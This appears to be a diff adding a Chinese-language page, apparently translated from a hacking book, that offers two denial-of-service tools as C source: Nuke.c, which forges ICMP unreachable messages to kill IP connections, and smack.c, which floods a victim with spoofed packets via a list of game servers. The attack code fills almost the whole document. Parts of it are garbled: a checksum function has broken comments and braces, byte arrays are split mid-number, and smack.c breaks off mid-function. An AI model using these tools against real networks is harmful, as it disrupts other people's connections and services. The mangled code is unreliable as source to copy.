@@ -1,0 +1,357 @@
+
+**摘要：** 一种可能终止 IP 连接的拒绝服务（DoS）攻击。
+
+**攻击状态：** 严重拥塞。
+
+**漏洞：** 适用于所有版本。
+
+**入侵：** 由著名超级黑客 Satanic Mechanic 撰写的 *Nuke.c* 是一种拒绝服务攻击，它利用 ICMP 不可达消息几乎可以切断任何 IP 连接。
+
+# Nuke.c
+
+```c
+#include <netdb.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/in_systm.h>
+#include <netinet/ip.h>
+#include <netinet/ip_icmp.h>
+#include <netinet/tcp.h>
+#include <signal.h>
+#include <errno.h>
+#include <string.h>
+#include <stdio.h>
+
+#define DEFAULT_UNREACH ICMP_UNREACH_PORT
+
+char *icmp_unreach_type[] = {
+    "net",
+    "host",
+    "protocol",
+    "port",
+    "frag",
+    "source",
+    "destnet",
+    "desthost",
+    "isolated",
+    "authnet",
+    "authhost",
+    "netsvc",
+    "hostsvc"
+};
+
+#define MAX_ICMP_UNREACH (sizeof(icmp_unreach_type)/sizeof(char *))
+
+int resolve_unreach_type(arg)
+    char *arg;
+{
+    int i;
+    
+    for (i=0; i < MAX_ICMP_UNREACH; i++) {
+        if (!strcmp(arg,icmp_unreach_type[i])) return i;
+    }
+return -1;
+}
+
+int resolve_host (host,sa)
+char *host;
+struct sockaddr_in *sa;
+{
+struct hostent *ent ;
+
+bzero(sa,sizeof(struct sockaddr));
+sa->sin_family = AF_INET;
+if (inet_addr(host) == -1) {
+ent = gethostbyname(host);
+if (ent != NULL) {
+sa->sin_family = ent->h_addrtype;
+bcopy(ent->h_addr, (caddr_t)&sa->sin_addr,ent->h_length);
+return(0);}
+else {
+fprintf(stderr,"error: unknown host %s\n",host);
+return(-1);}
+}
+return(0);
+}
+
+in_cksum(addr, len) /* from ping.c */
+u_short *addr;
+int len;
+{
+register int nleft = len;
+register u_short *w = addr;
+register int sum = 0;
+u_short answer = 0;
+
+/*
+Our algorithm is simple, using a 32-bit accumulator (sum),
+we add sequential 16-bit words to it, and at the end, fold
+back all the carry bits from the top 16 bits into the lower
+16 bits.
+*/
+while( nleft > 1 ) {
+sum += *w++;
+nleft -= 2;
+}
+
+/* mop up an odd byte, if necessary */
+if( nleft == 1 ) {
+*(u_char *)(&answer) = *(u_char *)w;
+
+sum += answer;
+}
+
+/*
+ * add back carry outs from top 16 bits to low 16 bits
+ */
+sum = (sum >> 16) + (sum & 0xffff);   /* add hi 16 to low 16 */
+sum += (sum >> 16);
+
+/*
+ * answer = ~sum;    /* add carry */
+ *               /* truncate to 16 bit */
+}
+return (answer);
+
+int icmp_unreach(host, uhost, port, type)
+        char *host,*uhost;
+        int type,port;
+{
+        struct sockaddr_in name;
+        struct sockaddr dest, uspoof;
+        struct icmp *mp;
+        struct tcphdr *tp;
+        struct protoent *proto;
+
+        int i, s, rc;
+        char *buf = (char *) malloc(sizeof(struct icmp)+64);
+        mp = (struct icmp *) buf;
+        if (resolve_host(host,&dest) <0) return(-1);
+        if (resolve_host(uhost,&uspoof) <0) return(-1);
+        if ((proto = getprotobyname("icmp")) == NULL) {
+                fputs("unable to determine protocol number of \"icmp\n", stderr);
+                return(-1);
+        }
+        if ((s = socket(AF_INET, SOCK_RAW, proto->p_proto)) <0 ) {
+                perror("Opening raw socket");
+                return(-1);
+        }
+
+        /* Assign it to a port */
+        name.sin_family = AF_INET;
+        name.sin_addr.s_addr = INADDR_ANY;
+        name.sin_port = htons(port);
+
+        /* Bind it to the port */
+        rc = bind(s, (struct sockaddr *) & name, sizeof(name));
+        if (rc == -1) {
+                perror("bind");
+
+                return(-1);
+        }
+
+        if ((proto = getprotobyname("tcp")) == NULL) {
+                fputs("unable to determine protocol number of \"icmp\n", stderr);
+                return(-1);
+        }
+
+		/* the following messy stuff from Adam Glass (icmpsquish.c) */
+		bzero(mp, sizeof(struct icmp)+64);
+		mp->icmp_type = ICMP_UNREACH;
+		mp->icmp_code = type;
+		mp->icmp_ip.ip_v = IPVERSION;
+		mp->icmp_ip.ip_hl = 5;
+		mp->icmp_ip.ip_len = htons(sizeof(struct ip)+64+20);
+		mp->icmp_ip.ip_p = IPPROTO_TCP;
+		mp->icmp_ip.ip_src = ((struct sockaddr_in *) &dest)->sin_addr;
+		mp->icmp_ip.ip_dst = ((struct sockaddr_in *) &uspoof)->sin_addr;
+		mp->icmp_ip.ip_ttl = 179;
+		mp->icmp_cksum = 0;
+		tp = (struct tcphdr *) ((char *) &mp->icmp_ip+sizeof(struct ip));
+		tp->th_sport = 23;
+		tp->th_dport = htons(port);
+		tp->th_seq = htonl(0x275624F2);
+		mp->icmp_cksum = htons(in_cksum(mp, sizeof(struct icmp)+64));
+		if ((i= sendto(s,buf,sizeof(struct icmp)+64, 0,&dest,sizeof(dest))) <0 ) {
+			perror("sending icmp packet");
+			return(-1);
+		}
+
+		return(0);
+	}
+
+
+void main(argc,argv)
+int argc;
+char **argv;
+{
+int i, type;
+
+if ((argc <4) || (argc >5)) {
+fprintf(stderr,"usage: nuke host uhost port [unreach_type]\n");
+exit(1);
+}
+
+if (argc == 4) type = DEFAULT_UNREACH;
+else type = resolve_unreach_type(argv[4]);
+
+if ((type <0) || (type > MAX_ICMP_UNREACH)) {
+fputs("invalid unreachable type",stderr);
+exit(1);
+}
+
+if (icmp_unreach(argv[1],argv[2],atoi(argv[3]),type) <0) exit(1);
+exit(0);
+}
+```
+
+# 拒绝服务攻击
+
+**摘要**：如本章前文所述，`smack.c` 是一种拒绝服务攻击，它从自定义的随机 IP 地址发送随机 ICMP 不可达数据包。
+
+**漏洞**：全部。
+
+**入侵**：该拒绝服务攻击被设计为一种连接终结者，因为受害者会收到大量来自插入在 `*/ Insert` 和 `End` 部分之间的地址的数据包。
+
+**smack.c**
+
+```c
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/in_systm.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <sys/uio.h>
+#include <unistd.h>
+char conn_pack0[] = { -128,0,0,12,1,81,85,65,75,69,0,3 };
+char conn_pack1[] = { -1,-1,-1,-
+1,99,111,110,110,101,99,116,32,34,92,110,111,
+97,105,109,92,48,92,109,115,103,92,49,92,114
+,97,116,1
+101,92,50,53,48,48,92,98,111,116,116,109
+,99,111,1
+08,111,114,92,110,111,111,112,112,114,92,111,92,97,98,92,116,111,111,112,
+92,110,97,109,101,92,83,110,111,111,112,121,34,10 };
+#define PS0 20+8+12
+#define PS1 20+8+strlen(conn_pack1)
+char *servers[] = {
+*/ 在此处插入地址
+"xxx.xxx.xxx.xxx:26000:0",
+"xxx.xxx.xxx.xxx:26000:0",
+"xxx.xxx.xxx.xxx:26000:0",
+结束 */
+NULL
+} ;
+
+int i, s, fl, ret;
+unsigned int sp, dp;
+struct in_addr src, dst;
+struct sockaddr_in addr;
+char pack[1024];
+struct ip *iph;
+struct udphdr *udph;
+int read_data(void);
+int parse_in(char *);
+int addserv(char *, unsigned int, char);
+void main(int argc, char *argv[]) 
+{
+iph = (struct ip *)pack;
+udph = (struct udphdr *) (iph + 1);
+if (argc < 2) {
+printf("Usage: ./smack <target>\n", argv[0]);
+exit(-1);
+}
+printf("Slinging Packets... \n");
+src.s_addr = inet_addr(argv[1]);
+if (src.s_addr == -1) {
+printf("Invalid source IP: %s\n", argv[1]);
+exit(-1);
+}
+s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+if (s == -1) {
+perror("socket");
+exit(-1);
+}
+fl = 1;
+ret = setsockopt(s, IPPROTO_IP, IP_HDRINCL, &fl, sizeof(int));
+if (ret == -1) {
+perror("setsockopt");
+exit(-1);
+}
+bzero((char *)&addr, sizeof(addr));
+addr.sin_family = AF_INET;
+read_data();
+printf("UnFed.\n");
+}
+int parse_in(char *in)
+{
+int i, n, c, m, ret;
+char ip[16], tmp[6], mode, tmp2;
+unsigned int port;
+bzero(ip, 16); bzero(tmp, 6); mode = 0; port = 0; n = 0; c = 0; m = 0;
+tmp2 = 0;
+for (i = 0; i < strlen(in); i++) {
+if (in[i] != ' ') {
+if (in[i] != ':') {
+if (m == 0) {
+    ip[c] = in[i];
+    c++;
+}
+if (m == 1) {
+    tmp[c] = in[i];
+    c++;
+}
+if (m == 2) {
+    tmp2 = in[i];
+    break;
+}
+}
+else {
+    m++; c = 0;
+}
+}
+}
+port = (unsigned int)atoi(tmp);
+mode = (tmp2 - 48);
+addserv(ip, port, mode);
+return ret;
+}
+int read_data(void)
+{
+    int i;
+    char in[1024];
+    for (i = 0; i < 32767; i++) {
+        if (servers[i] == NULL)
+            break;
+        parse_in(servers[i]);
+    }
+    return 1;
+}
+int addserv(char *ip, unsigned int port, char mode)
+{
+    bzero(pack, 1024);
+    dp = port;
+    iph->ip_v = IPVERSION;
+    iph->ip_hl = sizeof *iph >> 2;
+    iph->ip_tos = 0;
+    iph->ip_ttl = 40;
+#ifdef BSD
+    if  (mode == 0)
+        iph->ip_len = PS0;
+    else
+        iph->ip_len = PS1;
+#else
+    if  (mode == 0)
+        iph->ip_len = htons(PS0);
+    else
+        iph->ip_len = htons(PS1);
+#endif
+```
